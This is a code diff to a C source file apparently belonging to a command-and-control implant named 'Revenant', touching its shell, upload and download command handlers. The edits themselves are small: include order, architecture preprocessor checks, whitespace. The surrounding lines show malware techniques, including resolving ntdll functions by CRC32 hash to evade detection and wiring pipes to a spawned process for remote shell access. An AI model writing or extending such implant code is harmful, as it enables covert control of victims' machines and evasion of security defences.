@@ -1,11 +1,11 @@
-#include "Obfuscation.h"
-#include "Revenant.h"
-#include "Command.h"
-#include "Package.h"
-#include "Config.h"
+#include "Asm.h"
 #include "Defs.h"
 #include "Core.h"
-#include "Asm.h"
+#include "Config.h"
+#include "Package.h"
+#include "Command.h"
+#include "Revenant.h"
+#include "Obfuscation.h"
 #include "Utilities.h"
 
 #include <tchar.h>
@@ -123,7 +123,7 @@ VOID CommandDispatcher() {
 
 VOID CommandShell( PPARSER Parser ){
 
-#if CONFIG_ARCH == x64
+#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
     void *p_ntdll = get_ntdll_64();
 #else
     void *p_ntdll = get_ntdll_32();
@@ -221,12 +221,10 @@ VOID CommandShell( PPARSER Parser ){
     // Setup handle array
     HANDLE handle_array[3] = { hStdInPipeRead, hStdOutPipeWrite, hStdOutPipeWrite };
 
-
     // set std error/out/in:
     proc_params->StandardError   = handle_array[2];
     proc_params->StandardOutput  = handle_array[1];
     proc_params->StandardInput   = handle_array[0];
-
 
     // allocate process heap
     void *p_rtl_allocate_heap = get_proc_address_by_hash(p_ntdll, RtlAllocateHeap_CRC32B);
@@ -319,7 +317,7 @@ VOID CommandShell( PPARSER Parser ){
 VOID CommandUpload( PPARSER Parser ) {
 
 //--------------------------------
-#if CONFIG_ARCH == x64
+#if CONFIG_ARCH == 64
     void *p_ntdll = get_ntdll_64();
 #else
     void *p_ntdll = get_ntdll_32();
@@ -435,7 +433,7 @@ VOID CommandUpload( PPARSER Parser ) {
 
 
 VOID CommandDownload( PPARSER Parser ) {
-#if CONFIG_ARCH == x64
+#if CONFIG_ARCH == 64
     void *p_ntdll = get_ntdll_64();
 #else
     void *p_ntdll = get_ntdll_32();
